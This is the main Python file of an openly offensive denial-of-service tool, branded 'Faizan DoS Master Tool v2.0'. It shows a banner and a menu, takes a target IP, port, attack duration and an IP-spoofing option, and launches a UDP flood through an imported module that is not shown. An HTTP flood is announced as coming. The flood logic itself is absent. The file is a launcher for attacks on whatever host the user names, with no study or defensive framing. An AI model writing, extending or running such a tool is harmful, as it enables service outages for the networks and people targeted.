# main.py — Faizan™ DoS Master Tool v2.0
import os
import random
import time
from modules.udp_flood import start_udp_flood
from utils.logger import log_attack
# from modules.http_flood import start_http_flood  # (آگے بنائیں گے)
# from utils.ip_spoofer import spoof_ip  # (آگے شامل کریں گے)
# from utils.logger import log_attack  # (آگے شامل کریں گے)

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""
\033[1;31m███████╗ █████╗ ██╗███████╗ █████╗ ███╗   ██╗    ███╗   ███╗ █████╗ ███████╗████████╗██████╗ 
\033[1;31m╚══███╔╝██╔══██╗██║██╔════╝██╔══██╗████╗  ██║    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔══██╗
\033[1;33m  ███╔╝ ███████║██║███████╗███████║██╔██╗ ██║    ██╔████╔██║███████║███████╗   ██║   ██████╔╝
\033[1;33m ███╔╝  ██╔══██║██║╚════██║██╔══██║██║╚██╗██║    ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔═══╝ 
\033[1;32m███████╗██║  ██║██║███████║██║  ██║██║ ╚████║    ██║ ╚═╝ ██║██║  ██║███████║   ██║   ██║     
\033[1;32m╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝     
                🔥 Faizan™ DoS Master Tool v2.0 🔥                                                                          
    """)

def intro():
    print("\n\033[1;36m[~] Welcome to Faizan™ DoS Master Tool v2.0 — Powerful. Stealth. Smart.")
    time.sleep(1)

def main_menu():
    clear()
    banner()
    intro()

    print("\n\033[1;34mSelect Attack Method:")
    print("1. UDP Flood")
    print("2. HTTP Flood (Coming Soon)")
    print("3. Exit\n")

    choice = input(">> ")

    if choice == '1':
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        duration = int(input("Attack Duration (sec): "))
        spoofing = input("Enable IP Spoofing? (y/n): ").lower() == 'y'

        start_udp_flood(ip, port, duration, spoof=spoofing)

    elif choice == '2':
        print("HTTP Flood Module under development.")

    elif choice == '3':
        print("Exiting...")
        exit()

    else:
        print("Invalid Choice!")
        time.sleep(1)
        main_menu()

if __name__ == "__main__":
    main_menu()
